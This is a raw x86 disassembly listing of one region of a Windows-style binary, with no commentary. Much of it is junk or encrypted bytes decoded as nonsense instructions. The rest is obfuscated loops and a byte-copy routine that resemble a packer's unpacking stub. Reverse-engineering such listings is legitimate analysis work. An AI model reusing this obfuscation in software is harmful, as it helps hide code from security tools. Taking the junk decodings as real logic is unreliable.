  410115:	adc    edx,DWORD PTR [ecx+0x74]
  410118:	and    BYTE PTR [ecx-0x5f7a795c],0x2d
  41011f:	mov    bl,0x7a
  410121:	aaa    
  410122:	addr16 and eax,0xa38dac3f
  410128:	jae    0x41014a
  41012a:	xchg   edx,eax
  41012b:	rcl    BYTE PTR [ebx-0x7ca8d65d],1
  410131:	adc    cl,BYTE PTR ds:0x75d428e6
  410137:	inc    ecx
  410138:	jmp    0x41011c
  41013a:	sbb    ch,BYTE PTR [eax+0x1d]
  41013d:	int    0xe9
  41013f:	pop    eax
  410140:	neg    BYTE PTR [ecx+0x5d]
  410143:	mov    dl,0x7d
  410145:	inc    edi
  410146:	dec    esp
  410147:	xchg   DWORD PTR [si+0x2f],ebp
  41014b:	out    dx,eax
  41014c:	and    DWORD PTR [edx+0x6c],ebp
  41014f:	enter  0x3049,0x4d
  410153:	push   DWORD PTR [esi-0x73]
  410156:	icebp  
  410157:	scas   al,BYTE PTR es:[edi]
  410158:	scas   al,BYTE PTR es:[edi]
  410159:	lods   al,BYTE PTR ds:[esi]
  41015a:	sahf   
  41015b:	dec    ebp
  41015c:	and    edi,DWORD PTR [esi+0x2f]
  41015f:	clc    
  410160:	gs (bad) 
  410162:	and    ebx,ebp
  410164:	imul   eax,DWORD PTR [esi+0x34],0xb82e201d
  41016b:	jo     0x4100f6
  41016d:	dec    ebx
  41016e:	xchg   edi,eax
  41016f:	fsub   DWORD PTR [ebx-0x7c702a2e]
  410175:	xor    DWORD PTR [ebx-0x39],ecx
  410178:	loopne 0x41015e
  41017a:	push   cs
  41017b:	push   gs
  41017d:	fwait
  41017e:	pusha  
  41017f:	es inc esp
  410181:	imul   ebp,DWORD PTR [ebx-0x74],0x31
  410185:	std    
  410186:	cmc    
  410187:	daa    
  410188:	icebp  
  410189:	add    eax,DWORD PTR [ebx-0x13]
  41018c:	imul   edi,DWORD PTR [eax-0x466c568c],0xffffff95
  410193:	fbstp  TBYTE PTR [eax+0x18fc671a]
  410199:	sub    dh,al
  41019b:	fwait
  41019c:	retf   
  41019d:	xchg   edi,eax
  41019e:	dec    ecx
  41019f:	pop    ebp
  4101a0:	sti    
  4101a1:	mov    bl,0xdc
  4101a3:	out    0x11,al
  4101a5:	jns    0x41021b
  4101a7:	arpl   WORD PTR [esi+0x2f486df0],si
  4101ad:	lds    ecx,FWORD PTR [ebx-0x4ceaa523]
  4101b3:	or     ch,ah
  4101b5:	jl     0x4101ce
  4101b7:	mov    esp,0x86666ff8
  4101bc:	push   ds
  4101bd:	mov    esi,0x3ed193cf
  4101c2:	call   0xb8058bba
  4101c7:	push   0xd
  4101c9:	mov    ds:0x481ce65f,eax
  4101ce:	cmc    
  4101cf:	cmp    DWORD PTR [eax-0x2],0xffffff8f
  4101d3:	icebp  
  4101d4:	mov    eax,ebp
  4101d6:	or     ebp,edi
  4101d8:	xchg   ebp,eax
  4101d9:	loope  0x4101ec
  4101db:	iret   
  4101dc:	rcr    BYTE PTR [edx+0xe5c9210],0x28
  4101e3:	in     al,dx
  4101e4:	cwde   
  4101e5:	(bad)  
  4101e6:	shl    DWORD PTR [ecx],cl
  4101e8:	jecxz  0x41017b
  4101ea:	inc    ebp
  4101eb:	test   DWORD PTR [edx-0x369d2e2],edi
  4101f1:	jne    0x4101ac
  4101f3:	adc    bl,bl
  4101f5:	jmp    0x4e9931f7
  4101fa:	cmp    eax,DWORD PTR [ebx]
  4101fc:	mov    esp,0xdf126951
  410201:	imul   edi,DWORD PTR [edx+eiz*1],0x4154591f
  410208:	xor    al,0xae
  41020a:	inc    ebp
  41020b:	pop    ecx
  41020d:	imul   ebp,DWORD PTR [ecx-0x662009b9],0x5537bf06
  410217:	pusha  
  410218:	(bad)  
  410219:	not    BYTE PTR [edx+0x56]
  41021c:	dec    ebp
  41021d:	in     eax,0x29
  41021f:	or     DWORD PTR [ebx+0x74],ebx
  410222:	pushf  
  410223:	data16 lods al,BYTE PTR ds:[esi]
  410225:	push   ecx
  410226:	jecxz  0x410259
  410228:	push   ebp
  410229:	and    ebp,DWORD PTR [eax+0x69]
  41022c:	and    dl,bl
  41022e:	(bad)  
  41022f:	and    ah,BYTE PTR [esi]
  410231:	arpl   bp,ax
  410233:	loopne 0x410264
  410235:	jmp    0x410237
  410237:	(bad)  
  410238:	out    0x77,eax
  41023a:	push   ebp
  41023b:	fiadd  DWORD PTR [edi]
  41023d:	ds push edx
  41023f:	(bad)  
  410241:	addr16 clc 
  410243:	(bad)  
  410244:	out    0x77,al
  410246:	jb     0x410282
  410248:	rol    DWORD PTR [edx],1
  41024a:	xchg   ebx,eax
  41024b:	mov    ch,0xfc
  41024d:	std    
  41024e:	mov    ecx,DWORD PTR [eax+0x7a]
  410251:	sahf   
  410252:	sbb    al,0x23
  410254:	adc    ch,ch
  410256:	pop    edx
  410257:	xlat   BYTE PTR ds:[ebx]
  410258:	in     al,0x98
  41025a:	sbb    BYTE PTR [edi],0x67
  41025d:	mov    DWORD PTR [ebp-0x3aa6700],0xac280010
  410267:	fcmovb st,st(1)
  410269:	data16 mov BYTE PTR [ebp-0x39],al
  41026d:	adc    ecx,DWORD PTR [eax+0x25a59c37]
  410273:	std    
  410274:	dec    edx
  410275:	sbb    al,0xb3
  410277:	inc    ebp
  410278:	inc    eax
  410279:	add    edx,esp
  41027b:	inc    ecx
  41027c:	cmp    al,0x99
  41027e:	pop    esi
  41027f:	and    eax,0x69a0ef23
  410284:	xchg   esp,eax
  410285:	pop    ebp
  410286:	(bad)  
  410287:	int    0x40
  410289:	fiadd  DWORD PTR [ecx]
  41028b:	dec    edi
  41028c:	iret   
  41028d:	jo     0x410287
  41028f:	xor    edx,esp
  410291:	jno    0x4102da
  410293:	jne    0x410310
  410295:	mov    esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4336eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43360f,0x433703
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433613,0x12
  4102c6:	cmp    DWORD PTR ds:0x433613,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433613,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433613,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433613
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433613,eax
  410303:	mov    eax,ds:0x433613
  410308:	dec    eax
  410309:	mov    ds:0x433613,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43360f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43360f
  41036b:	inc    eax
  41036c:	mov    ds:0x43360f,eax
  410371:	cmp    DWORD PTR ds:0x43360f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43360f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43360f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43360f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43360f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43361f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43367f,0x4336bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433667
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x270b5c48],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x410377
  4103eb:	and    DWORD PTR [edi-0x29db93dd],ebx
  4103f1:	mov    eax,ds:0x39dc0231
  4103f6:	mov    ah,BYTE PTR [ebx]
  4103f8:	or     edx,DWORD PTR [ecx-0x2b511d68]
  4103fe:	jmp    0x410443
  410400:	das    
  410401:	je     0x41044f
  410403:	icebp  
  410404:	mul    BYTE PTR [edi-0x22]
  410407:	retf   0xa72a
  41040a:	fld    TBYTE PTR [ebx]
  41040c:	push   edi
  41040d:	xchg   edx,eax
  41040e:	lahf   
  41040f:	mov    ebx,0x81763005
  410414:	pop    ebx
  410415:	call   0x555c:0xbc5bafb9
  41041c:	ss mov cl,0x34
  41041f:	cmp    al,0xd2
  410421:	out    dx,al
  410422:	xor    dl,dh
  410424:	mov    eax,0x1067926c
  410429:	sub    al,0x44
  41042b:	mov    dh,BYTE PTR [esi]
  41042d:	xor    bl,0xf9
  410430:	mov    ds:0xadb98333,eax
  410435:	mov    DWORD PTR [ebx],ecx
  410437:	mov    BYTE PTR [ecx+edx*2-0x60ae6d04],cl
  41043e:	or     eax,0x2755081b
  410443:	pop    eax
  410444:	or     eax,0xd55d9e7d
  410449:	call   0xbb8f:0x642e304f
  410450:	pop    ss
  410451:	xlat   BYTE PTR ds:[ebx]
  410452:	in     al,0x57
  410454:	pop    edx
  410455:	in     eax,dx
  410456:	fist   WORD PTR [ecx-0x41]
  410459:	xchg   edi,eax
  41045a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41045b:	and    dl,BYTE PTR [ebp+0x2]
  41045e:	mov    ch,0xaa
  410460:	mov    bl,0xb2
  410462:	push   esi
  410463:	(bad)  
  410464:	mov    eax,0x60013075
  410469:	in     al,0x8
  41046b:	call   0x1250:0xcc295867
  410472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410473:	dec    ebx
  410474:	sub    DWORD PTR [edi+0x3a],0x64
  410478:	into   
  410479:	mov    ah,0x19
  41047b:	mov    eax,0x8d64d09e
  410480:	sti    
  410481:	dec    ebp
  410482:	add    eax,0x5d36c6f5
  410487:	jns    0x4104fc
  410489:	pop    esp
  41048a:	mov    dl,0x1
  41048c:	iret   
  41048d:	or     ebx,DWORD PTR [esi-0x1f6905a0]
  410493:	stos   DWORD PTR es:[edi],eax
  410494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410495:	mov    ebx,0x690d732c
  41049a:	mov    ebp,DWORD PTR [edi-0x76fff9c5]
  4104a0:	push   ebp
  4104a1:	dec    edi
  4104a2:	adc    eax,0xf69cfc99
  4104a7:	or     al,0xba
  4104a9:	mov    eax,ds:0x508abf25
  4104ae:	(bad)  
  4104af:	aad    0xba
  4104b1:	mov    ch,BYTE PTR [ecx+eax*8-0x34e71ea3]
  4104b8:	repz imul eax,DWORD PTR [ecx],0x2a
  4104bc:	cli    
  4104bd:	push   edi
  4104be:	test   eax,0xb547de24
  4104c3:	cmp    eax,0x2d60007b
  4104c8:	jge    0x4104a1
  4104ca:	xor    cl,BYTE PTR [esi-0x1d8468af]
  4104d0:	jl     0x410518
  4104d2:	add    bl,BYTE PTR [edx+0x7eb2ad0d]
  4104d8:	addr16 addr16 jge 0x4104a1
  4104dc:	ins    DWORD PTR es:[edi],dx
  4104dd:	push   edx
  4104de:	add    edx,edi
  4104e0:	xlat   BYTE PTR gs:[ebx]
  4104e2:	push   ss
  4104e3:	mov    ah,0x3f
  4104e5:	adc    al,0x6f
  4104e7:	pop    ebp
  4104e8:	sbb    esp,DWORD PTR [ebx+0x59]
  4104eb:	adc    ah,BYTE PTR [ebx]
  4104ed:	dec    edx
  4104ee:	mov    ebp,0xbce5b90f
  4104f3:	sub    DWORD PTR [esp+eiz*4],esp
  4104f6:	sbb    BYTE PTR [edx+0x6b6384fe],al
  4104fc:	cmp    BYTE PTR [ebx-0x455b1a8d],al
  410502:	lock mov eax,ds:0x4237231e
  410508:	test   eax,0x90f08e51
  41050d:	push   ebx
  41050e:	inc    DWORD PTR [eax+0x1d]
  410511:	aas    
  410512:	mov    esp,0x7af7123
  410517:	mov    BYTE PTR [ebp+0x8],bl
  41051a:	jo     0x4104c0
  41051c:	add    bh,BYTE PTR [edi]
  41051e:	dec    ebx
  41051f:	stos   DWORD PTR es:[edi],eax
  410520:	out    0x3e,eax
  410522:	jle    0x410534
  410524:	mov    dh,0x4
  410526:	jle    0x410587
  410528:	cmp    eax,0x1cc308f8
  41052d:	gs push ss
  41052f:	dec    edi
  410530:	mov    eax,0xe518cd51
  410535:	jo     0x410501
  410537:	and    edi,ebx
  410539:	xor    dl,BYTE PTR [edx-0x11]
  41053c:	(bad)  
  41053d:	pushf  
  41053e:	fiadd  DWORD PTR [edi+0x51923ba7]
  410544:	jo     0x4104f1
  410546:	and    DWORD PTR [ebx],esp
  410548:	fldcw  WORD PTR [ebp+0x753e61ab]
  41054e:	dec    esp
  41054f:	fsub   DWORD PTR [ebp-0x3156bb51]
  410555:	stos   BYTE PTR es:[edi],al
  410556:	push   edi
  410557:	call   0xcc4d8192
  41055c:	(bad)  
  41055d:	fist   WORD PTR [edi]
  41055f:	jl     0x41056c
  410561:	push   ss
  410562:	mov    ecx,0xe908ddfe
  410567:	xchg   esp,eax
  410568:	jge    0x4105e6
  41056a:	xchg   BYTE PTR [ebx+0x4a],al
  41056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41056e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41056f:	xor    ch,ah
  410571:	push   ss
  410572:	popa   
  410573:	leave  
  410574:	sti    
  410575:	cld    
  410576:	mov    WORD PTR [eax+esi*8-0x8edc762],gs
  41057d:	jmp    0xa1ee:0x92ce883b
  410584:	(bad)  
  410585:	xor    ebp,esi
  410587:	imul   edi,DWORD PTR [ebx+0x21882cc],0x88b69d03
  410591:	sbb    ah,0xfb
  410594:	je     0x41060e
  410596:	clc    
  410597:	or     esi,DWORD PTR [esi+0x59]
  41059a:	or     eax,0xa89ca6ce
  41059f:	out    0x57,eax
  4105a1:	test   DWORD PTR [ecx-0x43],ebx
  4105a4:	por    mm6,QWORD PTR [ebp+0x11c15b6c]
  4105ab:	mov    ah,dh
  4105ad:	and    DWORD PTR [eax],edi
  4105af:	ins    BYTE PTR es:[edi],dx
  4105b0:	(bad)  
  4105b2:	add    DWORD PTR [ecx],ecx
  4105b4:	sub    eax,0x8965f4
  4105b9:	or     eax,0x6279a957
  4105be:	(bad)  
  4105bf:	test   DWORD PTR [eax+0x6d933d08],ebp
  4105c5:	arpl   bp,cx
  4105c7:	mov    eax,ds:0x2a50b63d
  4105cc:	mov    esi,0x6f4bea73
  4105d2:	fwait
  4105d3:	adc    al,0xea
  4105d5:	inc    esi
  4105d6:	add    al,0x9e
  4105d8:	add    dh,BYTE PTR [ebx]
  4105da:	sbb    ebx,DWORD PTR [eax]
  4105dc:	add    DWORD PTR [edx],ebx
  4105de:	pop    es
  4105df:	push   edi
  4105e0:	ins    DWORD PTR es:[edi],dx
  4105e1:	ins    DWORD PTR es:[edi],dx
  4105e2:	aam    0xcb
  4105e4:	(bad)  
  4105e5:	jns    0x41056c
  4105e7:	xor    dh,cl
  4105e9:	int3   
  4105ea:	cli    
  4105eb:	fs push esp
  4105ed:	mov    eax,ds:0x7e60955e
  4105f2:	test   al,0x52
  4105f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105f5:	rcl    DWORD PTR [ebx],cl
  4105f7:	xchg   ebx,eax
  4105f8:	popf   
  4105f9:	sub    al,0xc3
  4105fb:	mov    eax,ds:0x4de9297a
  410600:	into   
  410601:	cmp    dh,ch
  410603:	sbb    dl,BYTE PTR [edx+0x2c]
  410606:	sar    BYTE PTR [edi],0x5
  410609:	lahf   
  41060a:	addr16 xor al,0x76
  41060d:	sti    
  41060e:	enter  0x2389,0x37
  410612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410613:	xor    eax,0x73da96c0
  410618:	rcl    BYTE PTR [edx+0x16b48c2d],cl
  41061e:	stos   BYTE PTR es:[edi],al
  41061f:	jae    0x410608
  410621:	pop    ebx
  410622:	call   0xaeab:0x31df2fbc
  410629:	push   ecx
  41062a:	inc    ecx
  41062b:	stc    
  41062c:	(bad)  
  41062d:	into   
  41062e:	xor    bl,BYTE PTR [esi]
  410630:	fadd   DWORD PTR [esi+ebx*8-0x67ffe2e0]
  410637:	xchg   bh,dh
  410639:	lods   al,BYTE PTR ds:[esi]
  41063a:	xchg   ecx,eax
  41063b:	nop
  41063c:	repz test eax,0xa091a8c5
  410642:	(bad)  
  410643:	fcmove st,st(1)
  410645:	jno    0x410617
  410647:	or     BYTE PTR [ebx-0x23240ac8],bl
  41064d:	sbb    eax,0xb21035be
  410652:	xor    eax,DWORD PTR [eax-0x5b7e6068]
  410658:	popf   
  410659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41065a:	push   ebx
  41065b:	retf   0xcbc5
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433613,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433613
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433613,edx
  41067c:	cmp    DWORD PTR ds:0x433613,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433613,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4336ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43361b
  4106ad:	mov    DWORD PTR ds:0x4336ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433633,0x17
  4106c0:	cmp    DWORD PTR ds:0x433633,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433633,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4337fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433633,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433633
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433633,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433633
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433633,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4336f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4336b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433617,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433627,0x4336ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	adc    ecx,DWORD PTR [ebx+0x5c]
  4107d7:	arpl   WORD PTR [ecx-0x15818145],dx
  4107dd:	jl     0x41085d
  4107df:	jle    0x41085f
  4107e1:	nop
  4107e2:	push   edi
  4107e3:	and    BYTE PTR [esp+edx*8+0x6ebaf69e],al
  4107ea:	add    BYTE PTR [edi],bl
  4107ec:	in     al,0x2a
  4107ee:	dec    DWORD PTR [edi]
  4107f0:	das    
  4107f1:	push   edi
  4107f2:	jnp    0x4107ef
  4107f4:	xor    al,0xd6
  4107f6:	pop    ebp
  4107f7:	cmp    BYTE PTR [ecx+0x18],al
  4107fa:	ja     0x4107c7
  4107fc:	loopne 0x410862
  4107fe:	xchg   ebp,eax
  4107ff:	fisub  WORD PTR [ecx-0x3bfd5fce]
  410805:	fiadd  WORD PTR [ecx]
  410807:	pop    ss
  410808:	mov    al,ds:0xf9f674d1
  41080d:	imul   eax,DWORD PTR [edi+0x1aae5988],0x20
  410814:	nop
  410815:	add    ebp,DWORD PTR [ebx-0x3f]
  410818:	(bad)  
  410819:	sub    eax,0x9ede7dbb
  41081e:	ins    BYTE PTR es:[edi],dx
  41081f:	cmp    dh,al
  410821:	and    ebx,DWORD PTR [edx]
  410823:	cmp    eax,DWORD PTR [esi-0x31]
  410826:	inc    eax
  410827:	push   eax
  410828:	in     eax,dx
  410829:	test   al,0x41
  41082b:	mov    dh,0x70
  41082d:	sti    
  41082e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41082f:	adc    esp,ebx
  410831:	or     eax,0xdadb34cd
  410836:	and    eax,0x4534eab1
  41083b:	in     eax,0x57
  41083d:	xor    BYTE PTR [ecx+0x49104098],0x12
  410844:	pop    es
  410845:	push   edi
  410846:	and    BYTE PTR [si],bh
  410849:	mov    dh,0xb9
  41084b:	xlat   BYTE PTR ds:[ebx]
  41084c:	or     BYTE PTR [ebx-0x49],0x6b
  410850:	and    eax,0xd853bebf
  410855:	mov    esi,0xef696df4
  41085a:	mov    cl,0x29
  41085c:	shr    DWORD PTR [ebp-0x16279f7b],0xa
  410863:	add    DWORD PTR [ebx-0x65],edi
  410866:	jle    0x4108b4
  410868:	(bad)  
  410869:	ficom  WORD PTR gs:[ebp+ebx*8+0x34003712]
  410871:	mov    esp,DWORD PTR [ecx+0x7000df1a]
  410877:	add    DWORD PTR [eax+0x3b15b8fe],esi
  41087d:	adc    BYTE PTR [ecx],ch
  41087f:	pop    ecx
  410880:	sahf   
  410881:	sbb    BYTE PTR [esi+0x28],al
  410884:	es inc edi
  410886:	xor    ebp,DWORD PTR [esi-0x5559a1aa]
  41088c:	cmp    eax,DWORD PTR [ebp-0x3ba24c11]
  410892:	sub    ch,BYTE PTR [ebx+0x63745023]
  410898:	jmp    0x16b8:0xf2fcb759
  41089f:	test   al,0xb1
  4108a1:	enter  0x25bf,0x7d
  4108a5:	adc    ecx,DWORD PTR [edi-0x7e0b9ca4]
  4108ab:	clc    
  4108ac:	iret   
  4108ad:	xchg   esi,eax
  4108ae:	js     0x41087b
  4108b0:	not    bl
  4108b2:	inc    eax
  4108b3:	sub    DWORD PTR [eax+0x39e82d08],edi
  4108b9:	mov    al,BYTE PTR [edx+0x6bafc1a8]
  4108bf:	xchg   esp,eax
  4108c0:	and    eax,0x6d3185bd
  4108c5:	push   edi
  4108c6:	mov    cl,0x7b
  4108c8:	call   0x64eb:0x7333b40d
  4108cf:	test   edx,edx
  4108d1:	mov    fs,WORD PTR [edi-0x5e]
  4108d4:	(bad)
  4108d7:	or     eax,0xf7907e0d
  4108dc:	leave  
  4108dd:	jae    0x410903
  4108df:	cmp    al,0x4f
  4108e1:	jno    0x410894
  4108e3:	inc    ebx
  4108e4:	(bad)  
  4108e5:	int3   
  4108e6:	pop    es
  4108e7:	inc    ecx
  4108e8:	lods   eax,DWORD PTR ds:[esi]
  4108e9:	adc    bh,BYTE PTR [ebx+0x430a2705]
  4108ef:	test   eax,edx
  4108f1:	xchg   esp,eax
  4108f2:	xor    ebp,ebp
  4108f4:	push   ds
  4108f5:	ret    0x5f99
  4108f8:	pop    ds
  4108f9:	jecxz  0x410926
  4108fb:	jo     0x410976
  4108fd:	popa   
  4108fe:	and    dh,BYTE PTR [eax+0x7339db75]
  410904:	cmp    esp,DWORD PTR [esi+eiz*1]
  410907:	aam    0x30
  410909:	mov    edi,0xa8d7a1a7
  41090e:	or     eax,ebx
  410910:	jg     0x41097d
  410912:	mov    edx,0xd6942a
  410917:	loope  0x4108ec
  410919:	or     DWORD PTR [edx-0x6108332],0x89371876
  410923:	sahf   
  410924:	iret   
  410925:	scas   al,BYTE PTR es:[edi]
  410926:	ficomp DWORD PTR [ecx]
  410928:	jbe    0x41092f
  41092a:	jno    0x41090c
  41092c:	mov    esp,ebp
  41092e:	jecxz  0x410950
  410930:	ins    BYTE PTR es:[edi],dx
  410931:	sub    DWORD PTR [esi],ebx
  410933:	fnsave [ebp+0x5fdeb924]
  410939:	daa    
  41093a:	es pop ss
  41093c:	xor    DWORD PTR [ebx+0x52],0x519b3d2b
  410943:	sbb    DWORD PTR [ecx],esi
  410945:	call   0x1059dd87
  41094a:	dec    eax
  41094b:	xor    eax,0x497e04c0
  410950:	push   0xffffff9d
  410952:	cmp    ah,dl
  410954:	push   ecx
  410955:	int3   
  410956:	repz and esi,ebp
  410959:	dec    esi
  41095a:	push   0xd12aac76
  41095f:	fsub   st,st(1)
  410961:	cmp    eax,0x9c6fb4b6
  410966:	retf   0x1040
  410969:	xchg   BYTE PTR [edx-0x34],dh
  41096c:	(bad)  
  41096d:	lds    eax,FWORD PTR [edx]
  41096f:	lea    esi,[ebx+edx*8+0x19]
  410973:	or     eax,0x9c5a42ab
  410978:	aaa    
  410979:	lods   eax,DWORD PTR ds:[esi]
  41097a:	add    al,0xb6
  41097c:	push   ecx
  41097d:	ret    0x7091
  410980:	retf   0xe2e5
  410983:	xor    bh,BYTE PTR [ecx-0x51562148]
  410989:	call   0x24f9:0xae26048d
  410990:	sbb    BYTE PTR [edi+0x44],0x36
  410994:	popf   
  410995:	and    DWORD PTR [ecx+0xd],ecx
  410998:	mov    ebx,0x614a7e45
  41099d:	sbb    eax,0xddf39028
  4109a2:	push   cs
  4109a3:	xchg   edi,eax
  4109a4:	inc    edx
  4109a5:	ficomp DWORD PTR [esi]
  4109a7:	adc    eax,0xe2e040d6
  4109ac:	fwait
  4109ad:	push   esp
  4109ae:	cmp    esp,0x63c8f077
  4109b4:	dec    esp
  4109b5:	adc    al,0x6b
  4109b7:	rcl    DWORD PTR [eax-0x43eb75b3],0xa5
  4109be:	hlt    
  4109bf:	xchg   edx,eax
  4109c0:	add    DWORD PTR ds:0x574bc290,ebx
  4109c6:	out    dx,al
  4109c7:	cli    
  4109c8:	lods   eax,DWORD PTR ds:[esi]
  4109c9:	lea    edx,[ebp-0x25]
  4109cc:	or     ah,BYTE PTR [edx]
  4109ce:	jle    0x410a37
  4109d0:	xchg   esi,eax
  4109d1:	mov    WORD PTR [esi-0xa16153f],ss
  4109d7:	jb     0x4109ee
  4109d9:	inc    ecx
  4109da:	xchg   ebx,eax
  4109db:	aas    
  4109dc:	inc    ebx
  4109dd:	ss or  dh,ah
  4109e0:	and    eax,DWORD PTR [ecx-0x5f]
  4109e3:	jbe    0x4109bf
  4109e5:	inc    edi
  4109e6:	test   al,0x4
  4109e8:	pop    edx
  4109e9:	sub    esp,DWORD PTR [edx+edi*2]
  4109ec:	adc    eax,0x4af867f9
  4109f1:	dec    eax
  4109f2:	xlat   BYTE PTR ds:[ebx]
  4109f3:	aam    0x22
  4109f5:	mov    DWORD PTR [ecx-0x5a189dd0],edx
  4109fb:	into   
  4109fc:	scas   eax,DWORD PTR es:[edi]
  4109fd:	out    0x18,al
  4109ff:	adc    al,0xea
  410a01:	call   0x540c5814
  410a06:	jg     0x4109b4
